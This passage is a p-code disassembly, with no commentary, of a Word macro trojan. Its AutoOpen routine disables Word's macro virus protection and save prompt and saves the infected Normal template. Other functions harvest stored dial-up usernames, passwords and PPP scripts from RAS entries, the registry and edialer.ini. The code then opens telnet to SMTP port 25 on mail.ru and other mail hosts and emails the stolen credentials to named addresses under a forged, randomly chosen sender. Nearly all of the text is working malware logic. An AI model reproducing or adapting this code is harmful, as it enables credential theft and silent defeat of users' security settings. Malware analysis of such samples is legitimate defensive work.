' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #192:
' 	LitStr 0x0016 "<kashek@operamail.com>"
' 	St RecipientOfMessage_ 
' Line #193:
' 	LitStr 0x0012 "<kashek87@mail.ru>"
' 	St RecipientOfMessage_1 
' Line #194:
' 	LitStr 0x0007 "mail.ru"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "@mail.ru"
' 	St Domain_ 
' Line #195:
' 	LitStr 0x0006 "-dima-"
' 	LitStr 0x0008 "2vasiliy"
' 	LitStr 0x0006 "521521"
' 	LitStr 0x0009 "Intarsija"
' 	LitStr 0x0008 "KirovDVP"
' 	LitStr 0x0010 "Voronin_Vladimir"
' 	LitStr 0x0003 "abs"
' 	LitStr 0x0003 "ako"
' 	LitStr 0x000B "aleksiv2000"
' 	LitStr 0x000B "alena_elena"
' 	LitStr 0x000C "alexander555"
' 	LitStr 0x0007 "alexkis"
' 	LitStr 0x0007 "alltair"
' 	LitStr 0x0008 "alt-info"
' 	LitStr 0x0007 "anton76"
' 	LitStr 0x0008 "artyserg"
' 	LitStr 0x0006 "arxi77"
' 	LitStr 0x0003 "asp"
' 	LitStr 0x0003 "ate"
' 	LitStr 0x0009 "axel_extr"
' 	LitStr 0x0005 "balds"
' 	LitStr 0x000C "bars-profile"
' 	LitStr 0x000A "bigmoney4u"
' 	LitStr 0x0003 "bkp"
' 	LitStr 0x0008 "braut_99"
' 	LitStr 0x000A "broker-nsk"
' 	LitStr 0x0009 "c_service"
' 	LitStr 0x0007 "carlych"
' 	LitStr 0x0008 "datasave"
' 	ArgsArray Array 0x001D 
' 	St UsName 
' Line #196:
' 	LitStr 0x000F "ajax2.sovam.com"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #197:
' 	LitStr 0x0011 "www.operamail.com"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #198:
' Line #199:
' 	LitDI2 0x0003 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #200:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #201:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #202:
' Line #203:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #204:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #205:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #206:
' 	LitStr 0x000E "Connect failed"
' 	St NoConn_ 
' Line #207:
' 	ElseBlock 
' Line #208:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Òåëíåò - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #209:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #210:
' 	LitStr 0x0006 "Òåëíåò"
' 	St Twnd 
' Line #211:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #212:
' 	LitStr 0x0010 "Ñáîé ïîäêëþ÷åíèÿ"
' 	St NoConn_ 
' Line #213:
' 	ElseBlock 
' Line #214:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Telnet - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #215:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #216:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #217:
' 	LitStr 0x0010 "Ñáîé ïîäêëþ÷åíèÿ"
' 	St NoConn_ 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	EndIfBlock 
' Line #220:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #221:
' 	ArgsCall DoEvents 0x0000 
' Line #222:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #223:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #224:
' 	ArgsCall DoEvents 0x0000 
' Line #225:
' 	Ld Timer 
' 	St Start 
' Line #226:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0046 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #227:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #228:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld NoConn_ 
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #229:
' 	ArgsCall DoEvents 0x0000 
' Line #230:
' 	Loop 
' Line #231:
' 	Ld Handle 
' 	SelectCase 
' Line #232:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #233:
' Line #234:
' 	ArgsCall Read 0x0000 
' Line #235:
' 	Ld UsName 
' 	FnUBound 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd UsName 0x0001 
' 	St SenderDomain 
' Line #236:
' 	Ld UsName 
' 	FnUBound 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd UsName 0x0001 
' 	Ld Domain_ 
' 	Add 
' 	St SenderAddress 
' Line #237:
' Line #238:
' 	LineCont 0x000C 18 00 01 00 24 00 01 00 2E 00 01 00
' 	LitStr 0x0007 "helo My"
' 	Ld SenderDomain 
' 	Add 
' 	LitStr 0x000F "#$$mail from: <"
' 	Add 
' 	Ld SenderAddress 
' 	Add 
' 	LitStr 0x0003 ">#$"
' 	Add 
' 	LitStr 0x0009 "rcpt to: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x0002 "#$"
' 	Add 
' 	LitStr 0x0009 "rcpt to: "
' 	Add 
' 	Ld RecipientOfMessage_1 
' 	Add 
' 	LitStr 0x0008 "#$data#$"
' 	Add 
' 	LitStr 0x0007 "From: <"
' 	Add 
' 	Ld SenderAddress 
' 	Add 
' 	LitStr 0x0002 ">#"
' 	Add 
' 	LitStr 0x0004 "To: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	LitStr 0x0006 "Date: "
' 	Add 
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0058 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#"
' 	Add 
' 	LitStr 0x0050 "Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: 7bit##"
' 	Add 
' 	St SMTP 
' Line #239:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #240:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #241:
' 	Ld Grab 
' 	Ld SCP 
' 	Add 
' 	LitStr 0x0009 "##.#quit#"
' 	Add 
' 	St GrabStr 
' Line #242:
' 	Ld GrabStr 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #243:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #244:
' 	Ld Timer 
' 	St Start 
' Line #245:
' 	Ld hwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #246:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hwnd 
' Line #247:
' 	ArgsCall DoEvents 0x0000 
' Line #248:
' 	Loop 
' Line #249:
' 	Ld hwnd 
' 	SelectCase 
' Line #250:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #251:
' Line #252:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #253:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #254:
' 	CaseElse 
' Line #255:
' 	Ld hwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #256:
' 	Ld Friend 
' 	St NF 
' Line #257:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #258:
' 	Ld WinDir 
' 	LitStr 0x0009 "logow.sys"
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #259:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #260:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #261:
' 	ArgsCall DoEvents 0x0000 
' Line #262:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #263:
' 	ExitSub 
' Line #264:
' 	EndSelect 
' Line #265:
' 	CaseElse 
' Line #266:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #267:
' 	Ld HandleBW 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #268:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #269:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #270:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #271:
' 	LitDI2 0x0000 
' 	St HandleBW 
' Line #272:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #273:
' 	EndSelect 
' Line #274:
' 	StartForVariable 
' 	Next 
' Line #275:
' 	EndIfBlock 
' Line #276:
' 	EndSub 
' Line #277:
' 	FuncDefn (Function SCP())
' Line #278:
' 	Dim 
' 	VarDefn res (As Long)
' Line #279:
' 	Dim 
' 	VarDefn res1 (As Long)
' Line #280:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #281:
' 	Dim 
' 	VarDefn hkey (As Long)
' Line #282:
' 	Dim 
' 	VarDefn hkey1 (As Long)
' Line #283:
' 	Dim 
' 	VarDefn i (As Long)
' Line #284:
' 	Dim 
' 	VarDefn KeyName (As String)
' Line #285:
' 	Dim 
' 	VarDefn KeyLen (As Long)
' Line #286:
' 	Dim 
' 	VarDefn ClassName (As String)
' Line #287:
' 	Dim 
' 	VarDefn ClassLen (As Long)
' Line #288:
' 	Dim 
' 	VarDefn lastwrite
' Line #289:
' 	Dim 
' 	VarDefn user (As String)
' 	VarDefn PPPScript (As String)
' Line #290:
' 	Dim 
' 	VarDefn NF (As Long)
' Line #291:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #292:
' 	OnError (Resume Next) 
' Line #293:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0015 "RemoteAccess\Profile\"
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res 
' Line #294:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #295:
' 	LitStr 0x001A "Can not read entry from R."
' 	St Resalt 
' Line #296:
' 	Ld Resalt 
' 	St SCP 
' Line #297:
' 	ExitFunc 
' Line #298:
' 	EndIfBlock 
' Line #299:
' 	LitDI2 0x0000 
' 	St i 
' Line #300:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #301:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St KeyName 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St ClassName 
' Line #302:
' 	LitDI2 0x00FF 
' 	St KeyLen 
' 	BoS 0x0000 
' 	LitDI2 0x00FF 
' 	St ClassLen 
' Line #303:
' 	Ld hkey 
' 	Ld i 
' 	Ld KeyName 
' 	Ld KeyLen 
' 	LitDI2 0x0000 
' 	ParamByVal 
' 	Ld ClassName 
' 	Ld ClassLen 
' 	Ld lastwrite 
' 	ArgsLd RegEnumKeyEx 0x0008 
' 	St res 
' Line #304:
' 	Ld res 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #305:
' 	Ld KeyName 
' 	Ld KeyLen 
' 	ArgsLd LBound 0x0002 
' 	St KeyName 
' Line #306:
' 	Ld ClassName 
' 	Ld ClassLen 
' 	ArgsLd LBound 0x0002 
' 	St ClassName 
' Line #307:
' 	LitHI4 0x0001 0x8000 
' 	LitStr 0x0015 "RemoteAccess\Profile\"
' 	Ld KeyName 
' 	Add 
' 	LitDI2 0x0000 
' 	LitHI2 0x0008 
' 	Ld hkey1 
' 	ArgsLd RegOpenKeyEx 0x0005 
' 	St res1 
' Line #308:
' 	Ld res1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #309:
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\RemoteAccess\Profile\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0004 "user"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St user 
' Line #310:
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\RemoteAccess\Profile\"
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0009 "PPPScript"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St PPPScript 
' Line #311:
' 	Ld hkey1 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res1 
' Line #312:
' 	Ld PPPScript 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #313:
' 	Ld Friend 
' 	St NF 
' Line #314:
' 	OnError aaa 
' Line #315:
' 	Ld PPPScript 
' 	Ld NF 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #316:
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x1B58 
' 	Lt 
' 	IfBlock 
' Line #317:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #318:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #319:
' 	Ld PPPScript 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Tmp 
' 	Add 
' 	St PPPScript 
' Line #320:
' 	Loop 
' Line #321:
' 	ElseBlock 
' Line #322:
' 	Ld PPPScript 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "Ôàéë > 7 kB."
' 	Add 
' 	St PPPScript 
' Line #323:
' 	EndIfBlock 
' Line #324:
' 	Ld NF 
' 	Close 0x0001 
' Line #325:
' 	Label aaa 
' Line #326:
' 	OnError (Resume Next) 
' Line #327:
' 	EndIfBlock 
' Line #328:
' 	Ld Resalt 
' 	LitStr 0x000B "Connection "
' 	Add 
' 	Ld KeyName 
' 	Add 
' 	LitStr 0x0003 " - "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "user: "
' 	Add 
' 	Ld user 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "PPPScript:"
' 	Add 
' 	Ld PPPScript 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #329:
' 	ElseBlock 
' Line #330:
' 	Ld Resalt 
' 	LitStr 0x0015 "Can not open the key "
' 	Add 
' 	Ld KeyName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #331:
' 	EndIfBlock 
' Line #332:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #333:
' 	EndIfBlock 
' Line #334:
' 	Loop 
' Line #335:
' 	Ld hkey 
' 	ArgsLd RegCloseKey 0x0001 
' 	St res 
' Line #336:
' 	LitStr 0x000A "There are "
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0015 " Dial-up connections."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Resalt 
' 	Add 
' 	St Resalt 
' Line #337:
' 	Ld Resalt 
' 	St SCP 
' Line #338:
' 	EndFunc 
' Line #339:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #340:
' 	FuncDefn (Function WinDir())
' Line #341:
' 	Dim 
' 	VarDefn res (As Long)
' Line #342:
' 	Dim 
' 	VarDefn DirWin (As String)
' Line #343:
' Line #344:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St DirWin 
' Line #345:
' 	Ld DirWin 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St res 
' Line #346:
' 	Ld DirWin 
' 	Ld res 
' 	ArgsLd LBound 0x0002 
' 	St DirWin 
' Line #347:
' 	Ld DirWin 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St WinDir 
' Line #348:
' 	EndFunc 
' Line #349:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #350:
' Line #351:
' 	FuncDefn (Sub ToolsOptions())
' Line #352:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #353:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #354:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #355:
' 	EndWith 
' Line #356:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #357:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #358:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #359:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #360:
' 	EndWith 
' Line #361:
' 	EndSub 
' Line #362:
' 	FuncDefn (Function Grab())
' Line #363:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #364:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #365:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #366:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #367:
' 	OnError (Resume Next) 
' Line #368:
' 	Ld WinDir 
' 	LitStr 0x000B "edialer.ini"
' 	Add 
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #369:
' 	Ld Friend 
' 	St NF 
' Line #370:
' 	Ld WinDir 
' 	LitStr 0x000B "edialer.ini"
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #371:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #372:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #373:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #374:
' 	Ld Temp 
' 	Ld Tmp 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Temp 
' Line #375:
' 	EndIfBlock 
' Line #376:
' 	Loop 
' Line #377:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #378:
' 	EndIfBlock 
' Line #379:
' 	Ld Temp 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Conn_ 0x0000 
' 	Add 
' 	St Temp 
' Line #380:
' 	Ld Temp 
' 	St Grab 
' Line #381:
' 	EndFunc 
' Line #382:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #383:
' 	FuncDefn (Sub AutoOpen())
' Line #384:
' 	OnError (Resume Next) 
' Line #385:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #386:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #387:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #388:
' 	EndSub 
' Line #389:
' 	FuncDefn (Function Conn_())
' Line #390:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn PAR (As type_00001450)
' Line #391:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #392:
' 	Dim 
' 	VarDefn S (As Long)
' Line #393:
' 	Dim 
' 	VarDefn ConName
' Line #394:
' 	Dim 
' 	VarDefn username
' Line #395:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #396:
' 	Dim 
' 	VarDefn res (As Long)
' Line #397:
' 	Dim 
' 	VarDefn MStr
' Line #398:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #399:
' 	Dim 
' 	VarDefn PARAM (As RASDIALPARAMS)
' Line #400:
' 	Dim 
' 	VarDefn PWDdet (As Byte)
' Line #401:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #402:
' 	Dim 
' 	VarDefn z (As Long)
' Line #403:
' 	Dim 
' 	VarDefn PWD (As String)
' 	VarDefn UsName (As String)
' Line #404:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #405:
' 	OnError (Resume Next) 
' Line #406:
' 	LitDI2 0x0108 
' 	LitDI2 0x0000 
' 	ArgsLd PAR 0x0001 
' 	MemSt dwSize 
' Line #407:
' 	LitDI2 0x0100 
' 	LitDI2 0x0000 
' 	ArgsLd PAR 0x0001 
' 	MemLd dwSize 
' 	Mul 
' 	St S 
' Line #408:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd PAR 0x0001 
' 	Ld S 
' 	Ld Counter 
' 	ArgsLd RasEnumEntries 0x0005 
' 	St res 
' Line #409:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #410:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0100 
' 	For 
' Line #411:
' 	Ld ConName 
' 	Ld j 
' 	Ld i 
' 	ArgsLd PAR 0x0001 
' 	ArgsMemLd szEntryName 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St ConName 
' Line #412:
' 	StartForVariable 
' 	Next 
' Line #413:
' 	Ld ConName 
' 	Ld ConName 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St ConName 
' Line #414:
' Line #415:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0100 
' 	For 
' Line #416:
' 	Ld n 
' 	Ld i 
' 	ArgsLd PAR 0x0001 
' 	ArgsMemLd szEntryName 0x0001 
' 	Ld n 
' 	Ld PARAM 
' 	ArgsMemSt szEntryName 0x0001 
' Line #417:
' 	StartForVariable 
' 	Next 
' Line #418:
' 	LitDI2 0x041C 
' 	Ld PARAM 
' 	MemSt dwSize 
' Line #419:
' 	LitDI2 0x0001 
' 	Ld PARAM 
' 	Ld PWDdet 
' 	ArgsLd RasGetEntryDialParams 0x0003 
' 	St res 
' Line #420:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0100 
' 	For 
' Line #421:
' 	Ld UsName 
' 	Ld z 
' 	Ld PARAM 
' 	ArgsMemLd szUserName 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St UsName 
' Line #422:
' 	Ld PWD 
' 	Ld z 
' 	Ld PARAM 
' 	ArgsMemLd szPassword 0x0001 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St PWD 
' Line #423:
' 	StartForVariable 
' 	Next 
' Line #424:
' 	Ld UsName 
' 	Ld UsName 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St UsName 
' Line #425:
' 	Ld PWD 
' 	Ld PWD 
' 	Ld vbNullChar 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St PWD 
' Line #426:
' 	Ld Resalt 
' 	LitStr 0x000C "Connection: "
' 	Add 
' 	Ld ConName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "User: "
' 	Add 
' 	Ld UsName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "Password: "
' 	Add 
' 	Ld PWD 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Resalt 
' Line #427:
' 	LitStr 0x0000 ""
' 	St PWD 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St UsName 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St ConName 
' Line #428:
' 	ArgsCall DoEvents 0x0000 
' Line #429:
' 	StartForVariable 
' 	Next 
' Line #430:
' 	Ld Resalt 
' 	St Conn_ 
' Line #431:
' 	EndFunc 
' Line #432:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #433:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #434:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #435:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #436:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #437:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #438:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #439:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #440:
' 	StartForVariable 
' 	Next 
' Line #441:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #442:
' 	ArgsCall Read 0x0000 
' Line #443:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #444:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #445:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #446:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #447:
